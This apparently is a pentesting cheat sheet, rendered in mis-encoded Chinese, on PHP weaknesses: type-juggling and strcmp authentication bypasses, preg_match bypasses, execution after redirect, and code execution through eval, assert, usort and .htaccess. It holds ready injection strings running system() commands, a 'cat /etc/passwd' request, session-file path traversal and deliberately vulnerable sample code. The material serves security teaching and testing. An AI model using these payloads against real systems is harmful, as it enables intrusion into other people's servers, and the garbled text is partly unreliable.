# PHP æŠ€å·§

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—® **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘çš„ **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## Cookies å¸¸è§ä½ç½®ï¼š

è¿™ä¹Ÿé€‚ç”¨äº phpMyAdmin çš„ cookiesã€‚

Cookies:
```
PHPSESSID
phpMyAdmin
```
ä½ç½®ï¼š
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## ç»•è¿‡PHPæ¯”è¾ƒ

### å®½æ¾æ¯”è¾ƒ/ç±»å‹è½¬æ¢ï¼ˆ==ï¼‰

å¦‚æœåœ¨PHPä¸­ä½¿ç”¨`==`ï¼Œåˆ™ä¼šå‡ºç°æ„å¤–æƒ…å†µï¼Œæ¯”è¾ƒçš„è¡Œä¸ºä¸é¢„æœŸä¸ç¬¦ã€‚è¿™æ˜¯å› ä¸º"=="åªæ¯”è¾ƒè½¬æ¢ä¸ºç›¸åŒç±»å‹çš„å€¼ï¼Œå¦‚æœæ‚¨è¿˜æƒ³æ¯”è¾ƒæ‰€æ¯”è¾ƒæ•°æ®çš„ç±»å‹æ˜¯å¦ç›¸åŒï¼Œæ‚¨éœ€è¦ä½¿ç”¨`===`ã€‚

PHPæ¯”è¾ƒè¡¨ï¼š[https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` ä»¥éæ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ç­‰äºæ•°å­—
* `"0xAAAA" == "43690" -> True` ç”±åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶æ ¼å¼ç»„æˆçš„å­—ç¬¦ä¸²å¯ä»¥ä¸å…¶ä»–æ•°å­—/å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ•°å­—ç›¸åŒï¼Œåˆ™ç»“æœä¸ºTrueï¼ˆå­—ç¬¦ä¸²ä¸­çš„æ•°å­—è¢«è§£é‡Šä¸ºæ•°å­—ï¼‰
* `"0e3264578" == 0 --> True` ä»¥"0e"å¼€å¤´å¹¶åè·Ÿä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº0
* `"0X3264578" == 0X --> True` ä»¥"0"å¼€å¤´å¹¶åè·Ÿä»»ä½•å­—æ¯ï¼ˆXå¯ä»¥æ˜¯ä»»ä½•å­—æ¯ï¼‰å’Œä»»ä½•å†…å®¹çš„å­—ç¬¦ä¸²å°†ç­‰äº0
* `"0e12334" == "0" --> True` è¿™éå¸¸æœ‰è¶£ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ§åˆ¶å­—ç¬¦ä¸²è¾“å…¥çš„"0"å’Œæ­£åœ¨è¿›è¡Œå“ˆå¸Œå’Œæ¯”è¾ƒçš„æŸäº›å†…å®¹ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨å¯ä»¥æä¾›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼å°†åˆ›å»ºä¸€ä¸ªä»¥"0e"å¼€å¤´ä¸”æ²¡æœ‰ä»»ä½•å­—æ¯çš„å“ˆå¸Œï¼Œæ‚¨å¯ä»¥ç»•è¿‡æ¯”è¾ƒã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å…·æœ‰æ­¤æ ¼å¼çš„**å·²ç»å“ˆå¸Œçš„å­—ç¬¦ä¸²**ï¼š[https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å­—æ¯éƒ½ç­‰äºæ•´æ•°0

æ›´å¤šä¿¡æ¯è¯·å‚é˜…[https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**ç±»å‹è½¬æ¢**ä¹Ÿä¼šå½±å“åˆ°`in_array()`å‡½æ•°çš„é»˜è®¤è¡Œä¸ºï¼ˆæ‚¨éœ€è¦å°†ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸ºtrueä»¥è¿›è¡Œä¸¥æ ¼æ¯”è¾ƒï¼‰ï¼š
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

å¦‚æœè¿™ä¸ªå‡½æ•°ç”¨äº**ä»»ä½•èº«ä»½éªŒè¯æ£€æŸ¥**ï¼ˆæ¯”å¦‚æ£€æŸ¥å¯†ç ï¼‰ï¼Œå¹¶ä¸”ç”¨æˆ·æ§åˆ¶æ¯”è¾ƒçš„ä¸€æ–¹ï¼Œä»–å¯ä»¥å‘é€ä¸€ä¸ªç©ºæ•°ç»„ä½œä¸ºå¯†ç çš„å€¼ (`https://example.com/login.php/?username=admin&password[]=`) æ¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼š
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
`strcasecmp()` ä¹Ÿä¼šå‡ºç°ç›¸åŒçš„é”™è¯¯ã€‚

### ä¸¥æ ¼ç±»å‹è½¬æ¢

å³ä½¿ä½¿ç”¨äº† `===`ï¼Œä»ç„¶å¯èƒ½å‡ºç°é”™è¯¯ï¼Œä½¿å¾—æ¯”è¾ƒå®¹æ˜“å—åˆ°ç±»å‹è½¬æ¢çš„æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¯”è¾ƒåœ¨æ¯”è¾ƒä¹‹å‰å°†æ•°æ®è½¬æ¢ä¸ºä¸åŒç±»å‹çš„å¯¹è±¡ï¼š
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** å¯ä»¥ç”¨äº**éªŒè¯ç”¨æˆ·è¾“å…¥**ï¼ˆå®ƒä¼š**æ£€æŸ¥**ç”¨æˆ·è¾“å…¥ä¸­æ˜¯å¦å­˜åœ¨æ¥è‡ª**é»‘åå•**çš„**å•è¯/æ­£åˆ™è¡¨è¾¾å¼**ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œä»£ç å¯ä»¥ç»§ç»­æ‰§è¡Œï¼‰ã€‚

#### æ¢è¡Œç»•è¿‡

ç„¶è€Œï¼Œå½“å®šç•Œæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹æ—¶ï¼Œ`preg_match()` **åªä¼šæ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„ç¬¬ä¸€è¡Œ**ï¼Œæ‰€ä»¥å¦‚æœä½ ä»¥æŸç§æ–¹å¼èƒ½å¤Ÿ**å°†è¾“å…¥åˆ†æˆå¤šè¡Œ**ï¼Œä½ å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ã€‚ä¾‹å¦‚ï¼š
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
ä¸ºäº†ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼Œä½ å¯ä»¥ä½¿ç”¨**æ¢è¡Œç¬¦è¿›è¡ŒURLç¼–ç **ï¼ˆ`%0A`ï¼‰å‘é€å€¼ï¼Œæˆ–è€…å¦‚æœä½ å¯ä»¥å‘é€**JSONæ•°æ®**ï¼Œå¯ä»¥å°†å…¶åˆ†æˆ**å¤šè¡Œ**å‘é€ï¼š
```php
{
"cmd": "cat /etc/passwd"
}
```
åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªä¾‹å­ï¼š[https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **é•¿åº¦é”™è¯¯ç»•è¿‡**

ï¼ˆè¿™ä¸ªç»•è¿‡ä¼¼ä¹åœ¨ PHP 5.2.5 ä¸Šå°è¯•è¿‡ï¼Œä½†åœ¨ PHP 7.3.15 ä¸Šæ— æ³•ä½¿å…¶å·¥ä½œï¼‰\
å¦‚æœä½ èƒ½å‘ `preg_match()` å‘é€ä¸€ä¸ªæœ‰æ•ˆçš„éå¸¸**å¤§çš„è¾“å…¥**ï¼Œå®ƒå°†**æ— æ³•å¤„ç†**å®ƒï¼Œä»è€Œä½¿ä½ èƒ½å¤Ÿ**ç»•è¿‡**æ£€æŸ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®ƒåœ¨é»‘åå•ä¸­åˆ—å‡ºäº†ä¸€ä¸ª JSONï¼Œä½ å¯ä»¥å‘é€ä»¥ä¸‹å†…å®¹ï¼š
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
ä»ï¼š[https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

### ç”¨äºPHPæ··æ·†çš„ç±»å‹è½¬æ¢æŠ€å·§

Type juggling is a technique used in PHP to perform implicit type conversion. It can be used for obfuscation purposes, making code harder to understand and analyze. In this write-up, we will explore how type juggling can be used to obfuscate PHP code.

ç±»å‹è½¬æ¢æ˜¯PHPä¸­ç”¨äºæ‰§è¡Œéšå¼ç±»å‹è½¬æ¢çš„ä¸€ç§æŠ€æœ¯ã€‚å®ƒå¯ä»¥ç”¨äºæ··æ·†ç›®çš„ï¼Œä½¿ä»£ç æ›´éš¾ç†è§£å’Œåˆ†æã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†æ¢è®¨å¦‚ä½•ä½¿ç”¨ç±»å‹è½¬æ¢æ¥æ··æ·†PHPä»£ç ã€‚

Type juggling in PHP occurs when a comparison or operation is performed between two variables of different types. PHP automatically converts the variables to a common type before performing the operation. This can lead to unexpected behavior and vulnerabilities if not handled properly.

åœ¨PHPä¸­ï¼Œå½“å¯¹ä¸¤ä¸ªä¸åŒç±»å‹çš„å˜é‡è¿›è¡Œæ¯”è¾ƒæˆ–æ“ä½œæ—¶ï¼Œä¼šå‘ç”Ÿç±»å‹è½¬æ¢ã€‚PHPåœ¨æ‰§è¡Œæ“ä½œä¹‹å‰ä¼šè‡ªåŠ¨å°†å˜é‡è½¬æ¢ä¸ºå…¬å…±ç±»å‹ã€‚å¦‚æœå¤„ç†ä¸å½“ï¼Œè¿™å¯èƒ½å¯¼è‡´æ„å¤–è¡Œä¸ºå’Œæ¼æ´ã€‚

One common example of type juggling is when comparing strings and integers. In PHP, the equality operator (`==`) performs type juggling, while the identity operator (`===`) does not. This can lead to vulnerabilities if developers mistakenly use the equality operator instead of the identity operator for string and integer comparisons.

ç±»å‹è½¬æ¢çš„ä¸€ä¸ªå¸¸è§ä¾‹å­æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•´æ•°ã€‚åœ¨PHPä¸­ï¼Œç­‰å·è¿ç®—ç¬¦ï¼ˆ`==`ï¼‰æ‰§è¡Œç±»å‹è½¬æ¢ï¼Œè€Œå…¨ç­‰è¿ç®—ç¬¦ï¼ˆ`===`ï¼‰åˆ™ä¸æ‰§è¡Œã€‚å¦‚æœå¼€å‘äººå‘˜é”™è¯¯åœ°åœ¨å­—ç¬¦ä¸²å’Œæ•´æ•°æ¯”è¾ƒä¸­ä½¿ç”¨ç­‰å·è¿ç®—ç¬¦è€Œä¸æ˜¯å…¨ç­‰è¿ç®—ç¬¦ï¼Œè¿™å¯èƒ½å¯¼è‡´æ¼æ´ã€‚

To obfuscate PHP code using type juggling, an attacker can manipulate the comparison or operation to achieve a desired outcome. This can involve carefully crafting input to exploit the type juggling behavior and bypass security checks.

ä¸ºäº†ä½¿ç”¨ç±»å‹è½¬æ¢æ¥æ··æ·†PHPä»£ç ï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµæ¯”è¾ƒæˆ–æ“ä½œä»¥å®ç°é¢„æœŸçš„ç»“æœã€‚è¿™å¯èƒ½æ¶‰åŠç²¾å¿ƒåˆ¶ä½œè¾“å…¥ä»¥åˆ©ç”¨ç±»å‹è½¬æ¢è¡Œä¸ºå¹¶ç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚

It is important for developers to be aware of type juggling vulnerabilities and use proper comparison operators to ensure secure code. Additionally, code reviews and security testing can help identify and mitigate type juggling issues in PHP applications.

å¼€å‘äººå‘˜éœ€è¦æ„è¯†åˆ°ç±»å‹è½¬æ¢æ¼æ´ï¼Œå¹¶ä½¿ç”¨é€‚å½“çš„æ¯”è¾ƒè¿ç®—ç¬¦æ¥ç¡®ä¿ä»£ç å®‰å…¨ã€‚æ­¤å¤–ï¼Œä»£ç å®¡æŸ¥å’Œå®‰å…¨æµ‹è¯•å¯ä»¥å¸®åŠ©è¯†åˆ«å’Œå‡è½»PHPåº”ç”¨ç¨‹åºä¸­çš„ç±»å‹è½¬æ¢é—®é¢˜ã€‚
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## æ‰§è¡Œé‡å®šå‘å (EAR)

å¦‚æœ PHP æ­£åœ¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œä½†åœ¨è®¾ç½®äº†å¤´éƒ¨çš„ `Location` åæ²¡æœ‰è°ƒç”¨ **`die`** æˆ– **`exit`** å‡½æ•°ï¼ŒPHP å°†ç»§ç»­æ‰§è¡Œå¹¶å°†æ•°æ®é™„åŠ åˆ°æ­£æ–‡ä¸­ï¼š
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## æ›´å¤šæŠ€å·§

* **register\_globals**: åœ¨ **PHP < 4.1.1.1** ç‰ˆæœ¬ä¸­ï¼Œæˆ–è€…é…ç½®é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šå¯ç”¨ **register\_globals**ï¼ˆæˆ–è€…å…¶è¡Œä¸ºè¢«æ¨¡æ‹Ÿï¼‰ã€‚è¿™æ„å‘³ç€åœ¨å…¨å±€å˜é‡ä¸­ï¼Œæ¯”å¦‚ $\_GETï¼Œå¦‚æœå®ƒä»¬æœ‰ä¸€ä¸ªå€¼ï¼Œæ¯”å¦‚ $\_GET\["param"]="1234"ï¼Œä½ å¯ä»¥é€šè¿‡ **$param æ¥è®¿é—®å®ƒã€‚å› æ­¤ï¼Œé€šè¿‡å‘é€ HTTP å‚æ•°ï¼Œä½ å¯ä»¥è¦†ç›–åœ¨ä»£ç ä¸­ä½¿ç”¨çš„å˜é‡**ã€‚
* **åŒä¸€åŸŸåä¸‹çš„ PHPSESSION cookies å­˜å‚¨åœ¨åŒä¸€ä¸ªä½ç½®**ï¼Œå› æ­¤å¦‚æœåœ¨ä¸€ä¸ªåŸŸåä¸‹çš„ **ä¸åŒè·¯å¾„ä½¿ç”¨ä¸åŒçš„ cookies**ï¼Œä½ å¯ä»¥ä½¿ä¸€ä¸ªè·¯å¾„ **è®¿é—®å¦ä¸€ä¸ªè·¯å¾„çš„ cookie**ï¼Œè®¾ç½®å¦ä¸€ä¸ªè·¯å¾„ cookie çš„å€¼ã€‚è¿™æ ·ï¼Œå¦‚æœ **ä¸¤ä¸ªè·¯å¾„éƒ½è®¿é—®åŒåçš„å˜é‡**ï¼Œä½ å¯ä»¥ä½¿è¯¥å˜é‡åœ¨è·¯å¾„1ä¸­çš„å€¼åº”ç”¨åˆ°è·¯å¾„2ä¸­ã€‚ç„¶åè·¯å¾„2å°†ä½¿ç”¨è·¯å¾„1çš„å˜é‡ï¼ˆé€šè¿‡ç»™ cookie è®¾ç½®ä¸è·¯å¾„2ä¸­å¯¹åº”çš„åç§°ï¼‰ã€‚
* å½“ä½ æ‹¥æœ‰æœºå™¨ä¸Šç”¨æˆ·çš„ **ç”¨æˆ·å** æ—¶ï¼Œæ£€æŸ¥åœ°å€ï¼š**/\~\<USERNAME>**ï¼Œçœ‹çœ‹æ˜¯å¦æ¿€æ´»äº† php ç›®å½•ã€‚
* [**ä½¿ç”¨ php åŒ…è£…å™¨è¿›è¡Œ LFI å’Œ RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

è¿™äº›å‡½æ•°é€šå¸¸ç”¨äº PHP ä¸­ä»å¯†ç ç”Ÿæˆå“ˆå¸Œå€¼ï¼Œå¹¶ä¸”ç”¨äºä¸å“ˆå¸Œå€¼æ¯”è¾ƒä»¥æ£€æŸ¥å¯†ç æ˜¯å¦æ­£ç¡®ã€‚\
æ”¯æŒçš„ç®—æ³•æœ‰ï¼š`PASSWORD_DEFAULT` å’Œ `PASSWORD_BCRYPT`ï¼ˆä»¥ `$2y$` å¼€å¤´ï¼‰ã€‚è¯·æ³¨æ„ï¼Œ**PASSWORD\_DEFAULT ç»å¸¸ä¸ PASSWORD\_BCRYPT ç›¸åŒ**ã€‚ç›®å‰ï¼Œ**PASSWORD\_BCRYPT** å¯¹è¾“å…¥çš„å¤§å°æœ‰ä¸€ä¸ªé™åˆ¶ï¼Œæœ€å¤šä¸º 72 å­—èŠ‚ã€‚å› æ­¤ï¼Œå½“ä½ å°è¯•ä½¿ç”¨æ­¤ç®—æ³•å¯¹å¤§äº 72 å­—èŠ‚çš„å†…å®¹è¿›è¡Œå“ˆå¸Œæ—¶ï¼Œåªæœ‰å‰ 72 å­—èŠ‚ä¼šè¢«ä½¿ç”¨ï¼š
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTPå¤´ç»•è¿‡æ»¥ç”¨PHPé”™è¯¯

å¦‚æœä¸€ä¸ªPHPé¡µé¢æ­£åœ¨æ‰“å°é”™è¯¯å¹¶å›æ˜¾ç”¨æˆ·æä¾›çš„ä¸€äº›è¾“å…¥ï¼Œç”¨æˆ·å¯ä»¥ä½¿PHPæœåŠ¡å™¨æ‰“å°å›ä¸€äº›è¶³å¤Ÿé•¿çš„å†…å®¹ï¼Œä»¥ä¾¿å½“å®ƒå°è¯•å°†å¤´éƒ¨æ·»åŠ åˆ°å“åº”æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠ›å‡ºé”™è¯¯ã€‚\
åœ¨ä¸‹é¢çš„åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…ä½¿æœåŠ¡å™¨æŠ›å‡ºäº†ä¸€äº›å¤§é”™è¯¯ï¼Œæ­£å¦‚ä½ åœ¨å±å¹•ä¸Šçœ‹åˆ°çš„ï¼Œå½“PHPå°è¯•ä¿®æ”¹å¤´éƒ¨ä¿¡æ¯æ—¶ï¼Œå®ƒæ— æ³•åšåˆ°ï¼ˆä¾‹å¦‚CSPå¤´éƒ¨æ²¡æœ‰å‘é€ç»™ç”¨æˆ·ï¼‰ï¼š

![](<../../../.gitbook/assets/image (465).png>)

## ä»£ç æ‰§è¡Œ

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[æŸ¥çœ‹è¿™é‡Œä»¥è·å–æ›´å¤šæœ‰ç”¨çš„PHPå‡½æ•°](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
æ‰§è¡Œâ€œreplaceâ€å‚æ•°ä¸­çš„ä»£ç è‡³å°‘éœ€è¦ä¸€ä¸ªåŒ¹é…é¡¹ã€‚\
è¿™ä¸ªpreg_replaceé€‰é¡¹åœ¨PHP 5.5.0ç‰ˆæœ¬ä¹‹åå·²ç»**è¢«å¼ƒç”¨**ã€‚

### **é€šè¿‡Eval()å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **é€šè¿‡ Assert() è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**

è¿™ä¸ª PHP å‡½æ•°å…è®¸ä½ æ‰§è¡Œä»¥å­—ç¬¦ä¸²å½¢å¼ç¼–å†™çš„ä»£ç ï¼Œä»¥è¿”å› true æˆ– falseï¼ˆå¹¶æ ¹æ®æ­¤æ¥æ”¹å˜æ‰§è¡Œæ–¹å¼ï¼‰ã€‚é€šå¸¸ï¼Œç”¨æˆ·å˜é‡ä¼šè¢«æ’å…¥åˆ°å­—ç¬¦ä¸²çš„ä¸­é—´ã€‚ä¾‹å¦‚ï¼š\
`assert("strpos($_GET['page']),'..') === false")` --> åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¦å®ç° **RCE**ï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
æ‚¨éœ€è¦**ç ´å**ä»£ç **è¯­æ³•**ï¼Œ**æ·»åŠ **æ‚¨çš„**æœ‰æ•ˆè½½è·**ï¼Œç„¶åå†**ä¿®å¤**å®ƒã€‚æ‚¨å¯ä»¥ä½¿ç”¨**é€»è¾‘æ“ä½œ**ï¼Œä¾‹å¦‚"**and**"æˆ–"**%26%26**"æˆ–"**|**"ã€‚è¯·æ³¨æ„ï¼Œ"or"ã€"||"ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºå¦‚æœç¬¬ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸï¼Œæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·å°†ä¸ä¼šè¢«æ‰§è¡Œã€‚åŒæ ·ï¼Œ";"ä¹Ÿä¸èµ·ä½œç”¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„æœ‰æ•ˆè½½è·ä¸ä¼šè¢«æ‰§è¡Œã€‚

**å¦ä¸€ç§é€‰æ‹©**æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­æ·»åŠ å‘½ä»¤çš„æ‰§è¡Œï¼š`'.highlight_file('.passwd').'`

**å¦ä¸€ç§é€‰æ‹©**ï¼ˆå¦‚æœæ‚¨æœ‰å†…éƒ¨ä»£ç ï¼‰æ˜¯ä¿®æ”¹æŸä¸ªå˜é‡ä»¥æ›´æ”¹æ‰§è¡Œæ–¹å¼ï¼š`$file = "hola"`

### **é€šè¿‡usort()å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰**

è¯¥å‡½æ•°ç”¨äºä½¿ç”¨ç‰¹å®šå‡½æ•°å¯¹é¡¹ç›®æ•°ç»„è¿›è¡Œæ’åºã€‚\
è¦æ»¥ç”¨æ­¤å‡½æ•°ï¼š
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**//**æ¥æ³¨é‡Šæ‰ä»£ç çš„å…¶ä½™éƒ¨åˆ†ã€‚

è¦å‘ç°éœ€è¦å…³é—­çš„æ‹¬å·æ•°é‡ï¼š

* `?order=id;}//`ï¼šæˆ‘ä»¬ä¼šæ”¶åˆ°ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼ˆ`Parse error: syntax error, unexpected ';'`ï¼‰ã€‚æˆ‘ä»¬å¯èƒ½ç¼ºå°‘ä¸€ä¸ªæˆ–å¤šä¸ªæ‹¬å·ã€‚
* `?order=id);}//`ï¼šæˆ‘ä»¬ä¼šæ”¶åˆ°ä¸€ä¸ª**è­¦å‘Š**ã€‚çœ‹èµ·æ¥å·®ä¸å¤šã€‚
* `?order=id));}//`ï¼šæˆ‘ä»¬ä¼šæ”¶åˆ°ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼ˆ`Parse error: syntax error, unexpected ')' i`ï¼‰ã€‚æˆ‘ä»¬å¯èƒ½æœ‰å¤ªå¤šçš„é—­åˆæ‹¬å·ã€‚

### **é€šè¿‡.httaccesså®ç°RCE**

å¦‚æœæ‚¨å¯ä»¥**ä¸Šä¼ **ä¸€ä¸ª**.htaccess**æ–‡ä»¶ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥**é…ç½®**å¤šä¸ªå†…å®¹ï¼Œç”šè‡³æ‰§è¡Œä»£ç ï¼ˆé…ç½®æ‰©å±•åä¸º.htaccessçš„æ–‡ä»¶å¯ä»¥**æ‰§è¡Œ**ï¼‰ã€‚

å¯ä»¥åœ¨[è¿™é‡Œ](https://github.com/wireghoul/htshells)æ‰¾åˆ°ä¸åŒçš„.htaccess shellã€‚

### é€šè¿‡ç¯å¢ƒå˜é‡å®ç°RCE

å¦‚æœæ‚¨æ‰¾åˆ°ä¸€ä¸ªå…è®¸æ‚¨åœ¨PHPä¸­**ä¿®æ”¹ç¯å¢ƒå˜é‡**çš„æ¼æ´ï¼ˆä»¥åŠå¦ä¸€ä¸ªå…è®¸æ‚¨ä¸Šä¼ æ–‡ä»¶çš„æ¼æ´ï¼Œå°½ç®¡é€šè¿‡æ›´å¤šçš„ç ”ç©¶å¯èƒ½å¯ä»¥ç»•è¿‡æ­¤é—®é¢˜ï¼‰ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨æ­¤è¡Œä¸ºæ¥è·å¾—**RCE**ã€‚

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path)ï¼šæ­¤ç¯å¢ƒå˜é‡å…è®¸æ‚¨åœ¨æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶æ—¶åŠ è½½ä»»æ„åº“ï¼ˆå°½ç®¡åœ¨è¿™ç§æƒ…å†µä¸‹å¯èƒ½ä¸èµ·ä½œç”¨ï¼‰ã€‚
